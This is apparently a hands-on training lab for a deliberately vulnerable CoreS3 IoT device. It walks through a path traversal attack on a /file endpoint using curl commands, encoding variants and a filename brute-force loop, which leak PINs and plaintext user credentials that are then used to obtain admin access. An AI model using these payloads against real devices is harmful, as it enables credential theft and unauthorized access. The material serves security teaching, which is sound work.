# L09: Path Traversal

## Goal

Access sensitive files outside the web root - including device credentials, PINs, and user databases - by exploiting a path traversal vulnerability in the `/file` endpoint.

## Background

### Why this matters

Path traversal (directory traversal / dot-dot-slash) lets attackers use `../` sequences to escape the intended directory and access files anywhere on the filesystem. In IoT devices, this frequently exposes plaintext credentials, WiFi passwords, and admin PINs. OWASP lists Broken Access Control as A01:2021.

### What you're looking for

- Endpoints that accept a filename or path parameter (`name=`, `file=`, `path=`, `download=`)
- No validation of `..` sequences
- Error messages that reveal directory structure
- Credentials stored in plaintext in config or user database files
- HTTP 200 responses even for errors (status in body, not HTTP code)

### How path traversal works

When a web server constructs a path like:

```cpp
String filepath = "/data/" + filename;
```

A `filename=../config` resolves `/data/../config` to `/config`, escaping the intended root.

| Technique | Example | Notes |
|-----------|---------|-------|
| Basic traversal | `../config` | Single level up |
| Multiple levels | `../../etc/passwd` | Two levels up |
| URL encoding | `..%2Fconfig` | `%2F` = `/` - bypasses naive filters |
| Double encoding | `..%252Fconfig` | `%252F` decodes to `%2F` then `/` |
| Null byte | `../config%00.txt` | Truncates path (legacy systems) |

### On CoreS3

The `/file?name=` endpoint serves files from a virtual `/data/` directory. The `name` parameter is concatenated directly into the path without sanitization. The firmware logs traversal attempts with `[WARN]` but does not block them ("detect but don't enforce"). No authentication is required.

Requesting `../config` returns the device configuration (admin PIN, user PIN, WiFi SSID, WiFi password in plaintext from NVS). Requesting `../users` exposes login credentials with role assignments.

## Hardware Setup

- CoreS3 device powered on and connected via USB (for serial monitoring)
- Computer connected to the device's WiFi AP
- Terminal with `curl`
- Optional: serial terminal for server-side logs

## Lab Walkthrough

### Step 1: Connect to the Device

Connect to the CoreS3 WiFi AP and verify the web interface is accessible. The `/file` endpoint requires no authentication.

```bash
# Connect to the device AP (shown on device screen)
# SSID: CoreS3-CAM-XXXX (open, no password)
# Device IP: 192.168.4.1

# Verify web interface is up
curl -s http://192.168.4.1/ | head -5
```

### Step 2: Discover the File Endpoint

Access `/file` with a legitimate filename to establish baseline behavior.

```bash
# Access a normal file from /data/
curl "http://192.168.4.1/file?name=logs.txt"
```

**Expected output:**

```
File access: /data/logs.txt

--- File Content ---
# Access Log
[12345] GET /file?name=logs.txt
[11345] GET /snapshot
[10345] POST /login
```

The response shows the server prepends `/data/` to the filename. Now try a non-existent file:

```bash
curl "http://192.168.4.1/file?name=secret.txt"
```

**Expected output:**

```
File access: /data/secret.txt

--- File Content ---
[File not found or access denied]
```

Returns HTTP 200 even for missing files - errors are in the response body only.

### Step 3: Path Traversal to Access Config

Use `../` to escape `/data/` and access the device configuration file containing NVS credentials.

```bash
curl "http://192.168.4.1/file?name=../config"
```

**Expected output:**

```
File access: /data/../config

--- File Content ---
# Device Configuration
wifi_ssid=not_set
wifi_pass=not_set
user_pin=XXXXXX
admin_pin=YYYYYY
device_id=1020BA26EEFC
firmware_version=1.0.0
```

| Field | Impact |
|-------|--------|
| `wifi_ssid` / `wifi_pass` | Network access (plaintext WiFi credentials) |
| `user_pin` | Unlock device touchscreen UI |
| `admin_pin` | Full admin access (touchscreen + web) |
| `device_id` | Device fingerprinting |
| `firmware_version` | Vulnerability research |

PINs are generated at first boot; `wifi_ssid`/`wifi_pass` show `not_set` until WiFi is configured.

### Step 4: Extract the User Database

Access the user database containing web interface login credentials.

```bash
curl "http://192.168.4.1/file?name=../users"
```

**Expected output:**

```
File access: /data/../users

--- File Content ---
# User Database
admin:CoreS3_Admin_2024!:admin
user:CoreS3_User_2024:user
```

Format is `username:password:role`. Use the admin credentials to obtain a JWT:

```bash
curl -X POST http://192.168.4.1/login \
  -d "username=admin" \
  -d "password=CoreS3_Admin_2024!"
```

**Expected output:**

```
Login successful (admin)

Token: eyJhbGciOiJIUzI1NiIs...
```

### Step 5: Verify Path Resolution Behavior

Test different traversal depths and filename variations.

```bash
# Direct keyword match also works
curl "http://192.168.4.1/file?name=config"

# Multiple traversal levels
curl "http://192.168.4.1/file?name=../../config"

# "users" keyword match
curl "http://192.168.4.1/file?name=users"
```

The server uses keyword matching: if the filename contains `config`, `users`, or `logs`, the corresponding file is returned. Both `../config` and `config` work, but the `../` prefix demonstrates the actual traversal vulnerability.

### Step 6: Observe Serial Output During Traversal

Monitor the serial console to see the firmware's "detect but don't enforce" logging.

```bash
# Connect to serial console (in a separate terminal)
pio device monitor -b 115200

# When you send the ../config request, serial output shows:
# [WEB] GET /file
# [WARN] Path traversal attempt: ../config
# [ACCESS] /file name=../config
```

The `[WARN]` log confirms the firmware recognizes traversal but serves the file anyway. Access is also logged to SD card at `/logs/access.log` if inserted.

### Step 7: Chain the Leaked Credentials

Use credentials from path traversal to access protected endpoints.

```bash
# Get JWT with leaked admin credentials
curl -X POST http://192.168.4.1/login \
  -d "username=admin" \
  -d "password=CoreS3_Admin_2024!"

# Access admin endpoints with JWT
TOKEN="<token from login response>"
curl -H "Authorization: Bearer $TOKEN" http://192.168.4.1/admin
curl -H "Authorization: Bearer $TOKEN" http://192.168.4.1/settings

# The admin PIN from ../config can also unlock admin mode on the touchscreen
```

This gives you: web admin access (JWT), physical admin access (PIN), WiFi network access (if configured), and user impersonation.

### Step 8: Automated Enumeration

Script a brute-force of common filenames through `/file`.

```bash
for name in config users passwd shadow env secrets keys db database \
            settings wifi credentials token jwt backup dump; do
  echo "=== Trying: $name ==="
  curl -s "http://192.168.4.1/file?name=../$name" | head -5
  echo
done
```

Only `config`, `users`, and `logs` variants return data; others return "File not found."

## Impact

- **Credential disclosure**: Admin PIN, user PIN, WiFi password leaked in plaintext from NVS
- **User database exposure**: Plaintext usernames, passwords, and roles
- **Authentication bypass**: Leaked admin credentials provide full web and touchscreen access
- **Network compromise**: WiFi password enables lateral movement
- **No authentication required**: Any device on the network can exploit `/file`
- **Detection without enforcement**: Traversal is logged but not blocked
- **Attack chaining**: Leaked credentials enable exploitation of `/admin`, `/settings`, and touchscreen admin mode

## References

- [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)
- [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
- [OWASP Top 10 A01:2021 - Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)
- [PayloadsAllTheThings - Directory Traversal](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal)
- [ESP32-S3 Technical Reference Manual](https://www.espressif.com/sites/default/files/documentation/esp32-s3_technical_reference_manual_en.pdf)
- [HackTricks - File Inclusion/Path Traversal](https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html)
